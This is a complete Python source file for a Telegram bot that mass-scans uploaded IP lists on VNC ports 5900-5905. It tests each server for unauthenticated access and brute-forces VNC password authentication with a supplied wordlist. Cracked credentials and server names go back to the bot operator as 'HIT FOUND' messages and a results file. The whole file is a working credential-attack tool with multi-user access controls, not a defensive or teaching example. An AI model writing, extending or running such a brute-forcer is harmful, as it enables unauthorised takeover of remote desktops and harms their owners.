import os
import asyncio
import socket
import threading
import time
from queue import Queue
from datetime import datetime
import struct
import d3des
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
from telegram.constants import ParseMode

OWNER_ID = int(os.getenv('OWNER_ID', '0'))
BOT_TOKEN = os.getenv('BOT_TOKEN', '')

sudo_users = set()
user_states = {}
active_scans = {}

VNC_PORTS = [5900, 5901, 5902, 5903, 5904, 5905]

def format_time(seconds):
    if seconds < 0:
        seconds = 0
    hours = int(seconds // 3600)
    minutes = int((seconds % 3600) // 60)
    secs = int(seconds % 60)
    return f"{hours}:{minutes:02d}:{secs:02d}"

class VNCScanner:
    def __init__(self, chat_id, bot, scan_threads=200, scan_timeout=2, brute_timeout=2):
        self.chat_id = chat_id
        self.bot = bot
        self.scan_threads = scan_threads
        self.scan_timeout = scan_timeout
        self.brute_timeout = brute_timeout
        self.queue = Queue()
        self.results = []
        self.lock = threading.Lock()
        self.total_servers = 0
        self.checked_servers = 0
        self.passwords = []
        self.running = True
        self.start_time = None
        self.message_id = None
        self.current_password = ""
        self.loop = None
        self.stopped = False
        self.active_threads = 0
        
    def load_ips(self, content):
        ips = []
        for line in content.split('\n'):
            line = line.strip()
            if line and not line.startswith('#'):
                if ':' in line:
                    ip, port = line.split(':')
                    ips.append((ip.strip(), int(port)))
                else:
                    for port in VNC_PORTS:
                        ips.append((line.strip(), port))
        return ips
        
    def load_passwords(self, content):
        passwords = ['']
        for line in content.split('\n'):
            line = line.strip()
            if line and not line.startswith('#'):
                passwords.append(line)
        return passwords
        
    def vnc_handshake(self, sock):
        try:
            sock.settimeout(self.brute_timeout)
            version = sock.recv(12)
            if not version.startswith(b'RFB '):
                return None, None
            sock.sendall(version)
            num_sec_types = sock.recv(1)
            if len(num_sec_types) == 0:
                return None, None
            num_types = num_sec_types[0]
            if num_types == 0:
                return None, None
            sec_types = sock.recv(num_types)
            return version.decode('utf-8', errors='ignore').strip(), sec_types
        except:
            return None, None
            
    def get_server_name(self, sock):
        try:
            sock.settimeout(self.brute_timeout)
            sock.recv(2)
            sock.recv(2)
            sock.recv(16)
            name_length_data = sock.recv(4)
            if len(name_length_data) == 4:
                name_length = struct.unpack('!I', name_length_data)[0]
                if name_length > 0 and name_length < 1024:
                    name = sock.recv(name_length)
                    return name.decode('utf-8', errors='ignore')
        except:
            pass
        return "None"
        
    def check_vnc_auth(self, ip, port, password=""):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.scan_timeout if not password else self.brute_timeout)
            sock.connect((ip, port))
            version, sec_types = self.vnc_handshake(sock)
            if version is None:
                sock.close()
                return False, None, None
            if sec_types and 1 in sec_types:
                sock.sendall(b'\x01')
                sock.settimeout(self.brute_timeout)
                result = sock.recv(4)
                if len(result) == 4:
                    auth_result = struct.unpack('!I', result)[0]
                    if auth_result == 0:
                        sock.sendall(b'\x01')
                        server_name = self.get_server_name(sock)
                        sock.close()
                        return True, "null", server_name
            elif sec_types and 2 in sec_types and password:
                sock.sendall(b'\x02')
                sock.settimeout(self.brute_timeout)
                challenge = sock.recv(16)
                if len(challenge) != 16:
                    sock.close()
                    return False, None, None
                key = (password + '\x00' * 8)[:8].encode('latin-1')
                response = d3des.desencrypt(key, challenge)
                sock.sendall(response)
                result = sock.recv(4)
                if len(result) == 4:
                    auth_result = struct.unpack('!I', result)[0]
                    if auth_result == 0:
                        sock.sendall(b'\x01')
                        server_name = self.get_server_name(sock)
                        sock.close()
                        return True, password, server_name
            sock.close()
            return False, None, None
        except Exception as e:
            return False, None, None
            
    def worker(self):
        while self.running:
            try:
                item = self.queue.get(timeout=1)
            except:
                continue
            if item is None:
                break
            
            with self.lock:
                self.active_threads += 1
            
            ip, port = item
            
            if not self.running:
                with self.lock:
                    self.active_threads -= 1
                self.queue.task_done()
                break
                
            success, password, server_name = self.check_vnc_auth(ip, port, "")
            if success:
                result = f"{ip}:{port}-{password}-[{server_name}]"
                with self.lock:
                    self.results.append(result)
                if self.loop:
                    asyncio.run_coroutine_threadsafe(self.send_hit(result), self.loop)
            else:
                for pwd in self.passwords[1:]:
                    if not self.running:
                        break
                    with self.lock:
                        self.current_password = pwd
                    success, password, server_name = self.check_vnc_auth(ip, port, pwd)
                    if success:
                        result = f"{ip}:{port}-{password}-[{server_name}]"
                        with self.lock:
                            self.results.append(result)
                        if self.loop:
                            asyncio.run_coroutine_threadsafe(self.send_hit(result), self.loop)
                        break
            
            with self.lock:
                self.checked_servers += 1
                self.active_threads -= 1
                
            self.queue.task_done()
    
    def stop(self):
        self.running = False
        self.stopped = True
        while not self.queue.empty():
            try:
                self.queue.get_nowait()
                self.queue.task_done()
            except:
                break
        for _ in range(self.scan_threads):
            try:
                self.queue.put(None)
            except:
                pass
            
    async def send_hit(self, result):
        text = f"<b>HIT FOUND</b>\n\n<code>{result}</code>"
        try:
            await self.bot.send_message(chat_id=self.chat_id, text=text, parse_mode=ParseMode.HTML)
        except Exception as e:
            print(f"Error sending hit: {e}")
            
    async def update_progress(self):
        while self.running and self.checked_servers < self.total_servers:
            await asyncio.sleep(3)
            if not self.running:
                break
            with self.lock:
                current = self.checked_servers
                total = self.total_servers
                hits = len(self.results)
                current_pwd = self.current_password
                active = self.active_threads
            elapsed = time.time() - self.start_time
            percent = (current / total) * 100 if total > 0 else 0
            speed = current / elapsed if elapsed > 0 else 0
            remaining = (total - current) / speed if speed > 0 else 0
            
            if current_pwd:
                trying_text = f'Trying "{current_pwd}" on {total} servers'
            else:
                trying_text = f'Trying "null" on {total} servers'
            
            text = (
                f"<b>VNC SCANNER STATUS</b>\n"
                f"<b>Progress:</b> {current}/{total} ({percent:.1f}%)\n"
                f"<b>Hits Found:</b> {hits}\n"
                f"<b>Elapsed:</b> {format_time(elapsed)}\n"
                f"<b>Remaining:</b> {format_time(remaining)}\n"
                f"<b>Active Threads:</b> {active}/{self.scan_threads}\n"
                f"<b>Timeout:</b> {self.scan_timeout}s\n"
                f"{trying_text}"
            )
            keyboard = [[InlineKeyboardButton("STOP SCAN", callback_data=f"stop_{self.chat_id}")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            try:
                if self.message_id:
                    await self.bot.edit_message_text(
                        chat_id=self.chat_id,
                        message_id=self.message_id,
                        text=text,
                        parse_mode=ParseMode.HTML,
                        reply_markup=reply_markup
                    )
            except Exception as e:
                pass
                
    async def run(self, ips_content, passwords_content):
        self.loop = asyncio.get_event_loop()
        
        ips = self.load_ips(ips_content)
        self.passwords = self.load_passwords(passwords_content)
        self.total_servers = len(ips)
        self.start_time = time.time()
        
        print(f"Starting scan with {len(ips)} servers and {len(self.passwords)} passwords")
        
        text = (
            f"<b>SCAN STARTED</b>\n\n"
            f"<b>Total Servers:</b> {self.total_servers}\n"
            f"<b>Passwords:</b> {len(self.passwords)}\n"
            f"<b>Threads:</b> {self.scan_threads}\n"
            f"<b>Timeout:</b> {self.scan_timeout}s\n\n"
            f"Initializing..."
        )
        keyboard = [[InlineKeyboardButton("STOP SCAN", callback_data=f"stop_{self.chat_id}")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        msg = await self.bot.send_message(
            chat_id=self.chat_id,
            text=text,
            parse_mode=ParseMode.HTML,
            reply_markup=reply_markup
        )
        self.message_id = msg.message_id
        
        threads = []
        for _ in range(self.scan_threads):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            t.start()
            threads.append(t)
            
        for ip_info in ips:
            if not self.running:
                break
            self.queue.put(ip_info)
            
        update_task = asyncio.create_task(self.update_progress())
        
        while self.running and (not self.queue.empty() or any(t.is_alive() for t in threads)):
            await asyncio.sleep(0.5)
        
        self.running = False
        
        for _ in range(self.scan_threads):
            try:
                self.queue.put(None)
            except:
                pass
        
        for t in threads:
            t.join(timeout=1)
            
        try:
            await asyncio.wait_for(update_task, timeout=2)
        except:
            pass
        
        elapsed = time.time() - self.start_time
        
        print(f"Scan finished: {self.checked_servers} servers in {elapsed:.2f}s")
        
        if self.stopped:
            text = (
                f"<b>SCAN STOPPED</b>\n\n"
                f"<b>Total Checked:</b> {self.checked_servers}/{self.total_servers}\n"
                f"<b>Hits Found:</b> {len(self.results)}\n"
                f"<b>Time Elapsed:</b> {format_time(elapsed)}\n\n"
                f"Scan was stopped by user"
            )
        else:
            text = (
                f"<b>SCAN COMPLETED</b>\n\n"
                f"<b>Total Checked:</b> {self.checked_servers}\n"
                f"<b>Hits Found:</b> {len(self.results)}\n"
                f"<b>Time Elapsed:</b> {format_time(elapsed)}\n\n"
                f"Results saved to file"
            )
        
        try:
            await self.bot.edit_message_text(
                chat_id=self.chat_id,
                message_id=self.message_id,
                text=text,
                parse_mode=ParseMode.HTML
            )
        except:
            pass
            
        if len(self.results) > 0:
            with open(f'results_{self.chat_id}.txt', 'w') as f:
                for result in self.results:
                    f.write(result + '\n')
            try:
                with open(f'results_{self.chat_id}.txt', 'rb') as f:
                    await self.bot.send_document(
                        chat_id=self.chat_id,
                        document=f,
                        filename=f'results_{datetime.now().strftime("%Y%m%d_%H%M%S")}.txt'
                    )
            except:
                pass
                
        if self.chat_id in active_scans:
            del active_scans[self.chat_id]

def is_authorized(user_id):
    return user_id == OWNER_ID or user_id in sudo_users

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_authorized(user_id):
        await update.message.reply_text("You are not authorized to use this bot.")
        return
        
    keyboard = [
        [InlineKeyboardButton("START SCAN", callback_data="new_scan")],
        [InlineKeyboardButton("SETTINGS", callback_data="settings")],
    ]
    if user_id == OWNER_ID:
        keyboard.append([InlineKeyboardButton("SUDO USERS", callback_data="sudo_menu")])
        
    reply_markup = InlineKeyboardMarkup(keyboard)
    text = (
        "<b>VNC BRUTE FORCER BOT</b>\n\n"
        "Select an option to continue"
    )
    await update.message.reply_text(text, reply_markup=reply_markup, parse_mode=ParseMode.HTML)

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    
    try:
        await query.answer()
    except:
        pass
    
    if not is_authorized(user_id):
        await query.edit_message_text("You are not authorized.")
        return
        
    if query.data == "new_scan":
        if user_id in active_scans:
            await query.edit_message_text("You already have an active scan. Stop it first.")
            return
        if user_id not in user_states:
            user_states[user_id] = {}
        user_states[user_id]["step"] = "waiting_ips"
        await query.edit_message_text("Send me the IP list file")
        
    elif query.data == "settings":
        if user_id not in user_states:
            user_states[user_id] = {}
        if "settings" not in user_states[user_id]:
            user_states[user_id]["settings"] = {
                "threads": 200,
                "scan_timeout": 2,
                "brute_timeout": 2
            }
        current_settings = user_states[user_id]["settings"]
        keyboard = [
            [InlineKeyboardButton(f"Threads: {current_settings['threads']}", callback_data="set_threads")],
            [InlineKeyboardButton(f"Scan Timeout: {current_settings['scan_timeout']}s", callback_data="set_scan_timeout")],
            [InlineKeyboardButton(f"Brute Timeout: {current_settings['brute_timeout']}s", callback_data="set_brute_timeout")],
            [InlineKeyboardButton("BACK", callback_data="back_main")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            "<b>SETTINGS</b>\n\nClick to change values\n\nNote: Bot scans all VNC ports (5900-5905) automatically",
            reply_markup=reply_markup,
            parse_mode=ParseMode.HTML
        )
        
    elif query.data.startswith("set_"):
        setting = query.data.replace("set_", "")
        if user_id not in user_states:
            user_states[user_id] = {}
        user_states[user_id]["step"] = f"setting_{setting}"
        await query.edit_message_text(f"Send new value for {setting.replace('_', ' ')}")
        
    elif query.data == "sudo_menu":
        if user_id != OWNER_ID:
            await query.answer("Only owner can access this")
            return
        sudo_list = "\n".join([f"- {uid}" for uid in sudo_users]) if sudo_users else "No sudo users"
        keyboard = [
            [InlineKeyboardButton("ADD SUDO", callback_data="add_sudo")],
            [InlineKeyboardButton("REMOVE SUDO", callback_data="remove_sudo")],
            [InlineKeyboardButton("BACK", callback_data="back_main")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        text = f"<b>SUDO USERS</b>\n\n{sudo_list}"
        await query.edit_message_text(text, reply_markup=reply_markup, parse_mode=ParseMode.HTML)
        
    elif query.data == "add_sudo":
        if user_id != OWNER_ID:
            return
        if user_id not in user_states:
            user_states[user_id] = {}
        user_states[user_id]["step"] = "add_sudo"
        await query.edit_message_text("Send user ID to add as sudo")
        
    elif query.data == "remove_sudo":
        if user_id != OWNER_ID:
            return
        if user_id not in user_states:
            user_states[user_id] = {}
        user_states[user_id]["step"] = "remove_sudo"
        await query.edit_message_text("Send user ID to remove from sudo")
        
    elif query.data == "back_main":
        keyboard = [
            [InlineKeyboardButton("START SCAN", callback_data="new_scan")],
            [InlineKeyboardButton("SETTINGS", callback_data="settings")],
        ]
        if user_id == OWNER_ID:
            keyboard.append([InlineKeyboardButton("SUDO USERS", callback_data="sudo_menu")])
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            "<b>VNC BRUTE FORCER BOT</b>\n\nSelect an option",
            reply_markup=reply_markup,
            parse_mode=ParseMode.HTML
        )
        
    elif query.data.startswith("stop_"):
        chat_id = int(query.data.split("_")[1])
        if chat_id in active_scans:
            active_scans[chat_id].stop()
            try:
                await query.answer("Stopping scan...")
            except:
                pass

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_authorized(user_id):
        return
        
    if user_id not in user_states:
        return
        
    state = user_states[user_id]
    
    if state.get("step") == "waiting_ips":
        if update.message.document:
            file = await context.bot.get_file(update.message.document.file_id)
            content = await file.download_as_bytearray()
            state["ips_content"] = content.decode('utf-8')
            state["step"] = "waiting_passwords"
            await update.message.reply_text("IP list received. Now send password file")
        else:
            await update.message.reply_text("Please send a file")
            
    elif state.get("step") == "waiting_passwords":
        if update.message.document:
            file = await context.bot.get_file(update.message.document.file_id)
            content = await file.download_as_bytearray()
            state["passwords_content"] = content.decode('utf-8')
            
            if "settings" not in state:
                state["settings"] = {
                    "threads": 200,
                    "scan_timeout": 2,
                    "brute_timeout": 2
                }
            settings = state["settings"]
            
            scanner = VNCScanner(
                chat_id=user_id,
                bot=context.bot,
                scan_threads=settings["threads"],
                scan_timeout=settings["scan_timeout"],
                brute_timeout=settings["brute_timeout"]
            )
            active_scans[user_id] = scanner
            
            asyncio.create_task(scanner.run(state["ips_content"], state["passwords_content"]))
            del user_states[user_id]
        else:
            await update.message.reply_text("Please send a file")
            
    elif state.get("step", "").startswith("setting_"):
        setting = state["step"].replace("setting_", "")
        try:
            value = int(update.message.text)
            if "settings" not in state:
                state["settings"] = {
                    "threads": 200,
                    "scan_timeout": 2,
                    "brute_timeout": 2
                }
            state["settings"][setting] = value
            user_states[user_id] = state
            
            keyboard = [[InlineKeyboardButton("BACK TO SETTINGS", callback_data="settings")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await update.message.reply_text(
                f"{setting.replace('_', ' ')} set to {value}",
                reply_markup=reply_markup
            )
        except:
            await update.message.reply_text("Invalid value. Send a number")
        
    elif state.get("step") == "add_sudo":
        try:
            sudo_id = int(update.message.text)
            sudo_users.add(sudo_id)
            await update.message.reply_text(f"User {sudo_id} added as sudo")
        except:
            await update.message.reply_text("Invalid user ID")
        if user_id in user_states:
            del user_states[user_id]
        
    elif state.get("step") == "remove_sudo":
        try:
            sudo_id = int(update.message.text)
            if sudo_id in sudo_users:
                sudo_users.remove(sudo_id)
                await update.message.reply_text(f"User {sudo_id} removed from sudo")
            else:
                await update.message.reply_text("User not in sudo list")
        except:
            await update.message.reply_text("Invalid user ID")
        if user_id in user_states:
            del user_states[user_id]

def main():
    if not BOT_TOKEN or OWNER_ID == 0:
        print("Please set BOT_TOKEN and OWNER_ID environment variables")
        return
        
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button_callback))
    application.add_handler(MessageHandler(filters.ALL, handle_message))
    
    print("Bot started")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
